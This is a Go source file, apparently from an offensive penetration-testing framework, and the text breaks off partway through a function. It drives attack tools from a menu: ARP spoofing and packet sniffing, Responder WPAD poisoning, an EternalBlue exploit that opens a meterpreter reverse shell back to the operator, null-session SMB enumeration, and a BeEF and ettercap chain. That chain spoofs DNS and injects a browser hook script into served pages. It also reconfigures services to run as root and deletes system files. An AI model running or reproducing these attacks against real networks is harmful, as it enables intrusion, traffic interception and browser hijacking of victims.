//John 3:16

package networks

import(
    "os"
    "fmt"
    "time"
    "bufio"
    "utils"
    "menus"
    "banners"
    "strings"
    "os/exec"
    "bcolors"
    "strconv"
    "subprocess"
    "scriptures"
)

var(
    FakeDns = "*"
    LPort = "9999"
    Mode = "single"
    IFace  = "eth0"
    Passwd = "Jesus"
    Spoofer = "ettercap"
    Proxies = "non"

    LHost, _ = utils.GetDefaultIP()
    scanner = bufio.NewScanner(os.Stdin)
    Gateway, _ = utils.GetDefaultGatewayIP()
    Name, Input, RHost, Target, Proxy, Function  string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordListDir = utils.DirLocations()
)

var defaultValues = map[string]string{

    "proxies": "",
    "fakedns": "*",
    "function": "",
    "lport": "9999",
    "iface": "eth0",
    "mode": "single",
    "passwd": "Jesus",
    "Spoofer": "ettercap",

    "lhost": LHost,
    "rhost": RHost,
    "rhosts": RHost,
    "target": RHost,
    "targets": RHost,
    "gateway": Gateway,
    "output": OutPutDir,
}

type stringMatcher struct {
    names  []string
    action func()
}

func NetworksPentest() {
    for {
        fmt.Printf("%s%safr3%s networks(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        scanner.Scan()
        Input = strings.TrimSpace(scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{
        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "cls", "clear", "cls screen", "clear screen", "screen cls", "screen clear"}, utils.ClearScreen},

        {[]string{"histo", "history", "show history", "log", "logs", "show log", "show logs"}, subprocess.ShowHistory},
        {[]string{"c junk", "c junks", "c output", "c outputs", "clear junk", "clear junks", "clear output", "clear outputs"}, utils.ClearJunks},
        {[]string{"c log", "c logs", "c history", "c histories", "clear log", "clear logs", "clear history", "clear histories"}, subprocess.ClearHistory},
        {[]string{"junk", "junks", "output", "outputs", "show junk", "show junks", "show output", "show outputs", "l junk", "l junks", "l output", "l outputs", "list junk", "list junks", "list output", "list outputs"}, utils.ListJunks},

        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutarilas},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        {[]string{"info"}, menus.HelpInfoNetworks},
        {[]string{"m", "menu"}, menus.MenuThree},
        {[]string{"option", "options", "show option", "show options"}, func() {menus.NetworksOptions(Mode, IFace, RHost, Passwd, LHost, Gateway, Spoofer, Proxies, FakeDns, Function)}},

        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListInternalFunctions},

        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run discover", "use discover", "exec discover", "start discover", "launch discover", "exploit discover", "execute discover"}, func() {NetworkPenFunctions("discover")}},
        {[]string{"? 1", "info 1", "help 1", "discover", "info discover", "help discover"}, menus.HelpInfoDiscover},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run portscan", "use portscan", "exec portscan", "start portscan", "launch portscan", "exploit portscan", "execute portscan"}, func() {NetworkPenFunctions("portscan")}},
        {[]string{"? 2", "info 2", "help 2", "portscan", "info portscan", "help portscan"}, menus.HelpInfoInPortScan},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run vulnscan", "use vulnscan", "exec vulnscan", "start vulnscan", "launch vulnscan", "exploit vulnscan", "execute vulnscan"}, func() {NetworkPenFunctions("vulnscan")}},
        {[]string{"? 3", "info 3", "help 3", "vulnscan", "info vulnscan", "help vulnscan"}, menus.HelpInfoInVulnScan},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run enumscan", "use enumscan", "exec enumscan", "start enumscan", "launch enumscan", "exploit enumscan", "execute enumscan"}, func() {NetworkPenFunctions("enumscan")}},
        {[]string{"? 4", "info 4", "help 4", "enumscan", "info enumscan", "help enumscan"}, menus.HelpInfoInEnumScan},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run smbexplo", "use smbexplo", "exec smbexplo", "start smbexplo", "launch smbexplo", "exploit smbexplo", "execute smbexplo"}, func() {NetworkPenFunctions("smbexplo")}},
        {[]string{"? 5", "info 5", "help 5", "smbexplo", "info smbexplo", "help smbexplo"}, menus.HelpInfoSmbExplo},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run psniffer", "use psniffer", "exec psniffer", "start psniffer", "launch psniffer", "exploit psniffer", "execute psniffer"}, func() {NetworkPenFunctions("psniffer")}},
        {[]string{"? 6", "info 6", "help 6", "psniffer", "info psniffer", "help psniffer"}, menus.HelpInfoPSniffer},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run responda", "use responda", "exec responda", "start responda", "launch responda", "exploit responda", "execute responda"}, func() {NetworkPenFunctions("responda")}},
        {[]string{"? 7", "info 7", "help 7", "responda", "info responda", "help responda"}, func() {menus.HelpInfoResponder(Mode, LPort, RHost, LHost)}},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run beefkill", "use beefkill", "exec beefkill", "start beefkill", "launch beefkill", "exploit beefkill", "execute beefkill"}, func() {NetworkPenFunctions("beefkill")}},
        {[]string{"? 8", "info 8", "help 8", "beefkill", "info beefkill", "help beefkill"}, func() {menus.HelpInfoBeefKill(Mode, LPort, Spoofer, RHost, LHost)}},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run toxssinx", "use toxssinx", "exec toxssinx", "start toxssinx", "launch toxssinx", "exploit toxssinx", "execute toxssinx"}, func() {NetworkPenFunctions("toxssinx")}},
        {[]string{"? 9", "info 9", "help 9", "toxssinx", "info toxssinx", "help toxssinx"}, func() {menus.HelpInfoToxssInx(Mode, LPort, Spoofer, RHost, LHost)}},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "mode": &Mode,
        "lhost": &LHost,
        "lport": &LPort,
        "iface": &IFace,
        "rhost": &RHost,
        "rhosts": &RHost,
        "target": &RHost,
        "targets": &RHost,
        "proxies": &Proxy,
        "passwd": &Passwd,
        "func": &Function,
        "funcs": &Function,
        "gateway": &Gateway,
        "fakedns": &FakeDns,
        "spoofer": &Spoofer,
        "module": &Function,
        "function": &Function,
        "functions": &Function,
    }

    validKeys := make([]string, 0, len(setValues))
    for k := range setValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 3

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }

        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Println()
        }

        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)
    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 3

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Println()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "mode": &Mode,
        "lhost": &LHost,
        "lport": &LPort,
        "iface": &IFace,
        "rhost": &RHost,
        "rhosts": &RHost,
        "target": &RHost,
        "targets": &RHost,
        "proxies": &Proxy,
        "passwd": &Passwd,
        "func": &Function,
        "funcs": &Function,
        "gateway": &Gateway,
        "fakedns": &FakeDns,
        "spoofer": &Spoofer,
        "module": &Function,
        "function": &Function,
        "functions": &Function,
    }

    defaultValues := map[string]string{
        "mode":     "",
        "lhost":    "",
        "lport":    "",
        "iface":    "",
        "rhost":    "",
        "rhosts":   "",
        "target":   "",
        "targets":  "",
        "proxies":  "",
        "passwd":   "",
        "func":     "",
        "funcs":    "",
        "gateway":  "",
        "fakedns":  "",
        "spoofer":  "",
        "module":   "",
        "function": "",
        "functions": "",
    }

    validKeys := make([]string, 0, len(unsetValues))
    for k := range unsetValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key]
        fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 3

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }
        
        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Println()
        }

        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 3

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Println()
    }
}

func executeFunction() {
    if Function == ""{
        fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    NetworkPenFunctions(Function, IFace, Gateway, LHost, RHost, Mode, FakeDns, Spoofer)
}

func NetworkPenFunctions(Function string, args ...interface{}) {
    if RHost != "" {
        fmt.Printf("\nRHOST => %s", RHost)
    }
    if Function != "" {
        fmt.Printf("\nFUNCTION => %s", Function)
    }
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            //
        }
    }

    commands := map[string]func(){
        "discover": func() {DiscoverIps()},
        "portscan": func() {NmapPortScan(RHost)},
        "vulnscan": func() {NmapVulnScan(RHost)},
        "enumscan": func() {SmbVulnScan(RHost); EnumNxc(RHost); Enum4linux(RHost); SmbMapScan(RHost)},
        "smbexplo": func() {SmbVulnScan(RHost); SmbExploit(RHost, LHost, LPort)},
        "psniffer": func() {PacketSniffer(Mode, RHost)},
        "responda": func() {KillerResponder(IFace, LHost)},
        "beefkill": func() {BeefKill(Spoofer, Mode, LHost, RHost, IFace, Passwd, FakeDns, Gateway)},
        "toxssinx": func() {ToxssInx(RHost)},

        "1": func() {DiscoverIps()},
        "2": func() {NmapPortScan(RHost)},
        "3": func() {NmapVulnScan(RHost)},
        "4": func() {SmbVulnScan(RHost); EnumNxc(RHost); Enum4linux(RHost); SmbMapScan(RHost)},
        "5": func() {SmbVulnScan(RHost); SmbExploit(RHost, LHost, LPort)},
        "6": func() {PacketSniffer(Mode, RHost)},
        "7": func() {KillerResponder(IFace, LHost)},
        "8": func() {BeefKill(Spoofer, Mode, LHost, RHost, IFace, Passwd, FakeDns, Gateway)},
        "9": func() {ToxssInx(RHost)},
    }

    textCommands := []string{"discover", "portscan", "vulnscan", "enumscan", "smbexplo", "psniffer", "responda", "beefkill", "toxssinx"}

    if action, exists := commands[Function]; exists {
        action()
        return
    }

    if num, err := strconv.Atoi(Function); err == nil {
        fmt.Printf("\n%s[!] %sNumber %d is invalid. Valid numbers are from 1-10.\n", bcolors.Yellow, bcolors.Endc, num)
        menus.ListInternalFunctions()
        return
    }

    lowerInput := strings.ToLower(Function)
    for _, cmd := range textCommands {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            fmt.Printf("\n%s[!] %sFunction '%s%s%s' is invalid. Did you mean %s'%s'%s?\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, Function, bcolors.Endc, bcolors.Green, cmd, bcolors.Endc)
            return
        }
    }

    fmt.Printf("\n%s[!] %sModule '%s' is invalid. Available commands:\n", bcolors.Yellow, bcolors.Endc, Function)
    menus.ListInternalFunctions()
}

func IpNeighbour() {
    fmt.Printf("\n%s[>] %sDiscovering connected devices ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`ip -h -s -d -a -c=auto -t neighbour`)
    return
}

func DiscoverIps() {
    fmt.Printf("\n%s[>] %sDiscovering connected devices ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; set net.scan on; net.show; active"`)
    return
}

func NaabuPortScan(RHost string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    subprocess.Popen(`naabu -host %s`, RHost)
    return
}

func NmapPortScan(RHost string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -p- %s`, RHost)
    return
}

func NmapVulnScan(RHost string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %svuln scan target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    subprocess.Popen(`nmap --open -v -T4 -n -sSV -p- --script="vuln and safe" --reason %s`, RHost)
    return
}

func SmbVulnScan(RHost string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sSMB vuln scan target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    subprocess.Popen(`nmap -sV -v --script "smb-vuln*" -p139,445 %s`, RHost)
    return
}

func Enum4linux(RHost string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    subprocess.Popen(`cd /root/.afr3/africana-base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, RHost)
    return
}

func EnumNxc(RHost string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-s --rid-brute --sessions --s --shares --pass-pol`, RHost)
    return
}

func SmbMapScan(RHost string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    subprocess.Popen(`smbmap -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, RHost, RHost)
    return
}

func RpcEnumScan(RHost string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sperforming rpc recon target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    subprocess.Popen(`rpcclient -U "" -N %s`, RHost)
    return
}

func ToxssInx(RHost string) {
    fmt.Printf("\n%s[>] %sperforming M.I.B attacks: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    subprocess.Popen(`cd %s/networks/toxssin/; python3 toxssin.py -u https://%s -c %s -k %s -p %s -v`, ToolsDir, LHost, CertPath, KeyPath, "443")
    return
}

func SmbExploit(RHost string, LHost string, LPort string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sexploiting smb on target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
    fmt.Printf("\nRHOST => %s\nLHOST => %s\nLPORT => %s\n", RHost, LHost, LPort)
    subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, RHost, LHost, LPort)
}

func PacketSniffer(Mode string, RHost string) {
    if _, err := exec.LookPath("bettercap"); err != nil {
        fmt.Printf("\n%s[!] %sBettercap isn't installed, install it with %s'sudo apt install responder.'%s\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    switch strings.ToLower(Mode) {
    case "single":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
        subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, RHost)
    case "all":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
        subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Mode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}

func KillerResponder(IFace string, LHost string) {
    filePath := "/root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana"

    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`cp /root/.afr3/africana-base/networks/responder/Responder.conf /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana`)

        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, LHost, LHost)
        filesToReplacements := map[string]map[string]string{
            "/root/.afr3/africana-base/networks/responder/Responder.conf": {
            `WPADScript =`: newString,
            },
        }

        utils.Editors(filesToReplacements)

        subprocess.Popen(`cd /root/.afr3/africana-base/networks/responder/; python3 Responder.py -I %s -Pdv`, IFace)
        subprocess.Popen(`rm -rf /root/.afr3/africana-base/networks/responder/Responder.conf; mv /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana /root/.afr3/africana-base/networks/responder/Responder.conf`)

    } else {
        subprocess.Popen(`cd /root/.afr3/africana-base/networks/responder/; python3 Responder.py -I %s -Pdv`, IFace)
        subprocess.Popen(`rm -rf /root/.afr3/africana-base/networks/responder/Responder.conf; mv /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana /root/.afr3/africana-base/networks/responder/Responder.conf`)
    }
}

func BeefEttercap(Mode string, LHost string, RHost string, IFace string, Passwd string, FakeDns string, Gateway string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    switch strings.ToLower(Mode) {
    case "single":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)

            }
            subprocess.Popen(`systemctl daemon-reload`)

            }

            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", LHost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, LHost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n" + bcolors.Endc)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, LHost)
            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, IFace, RHost, Gateway)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dn`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

    case "all":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
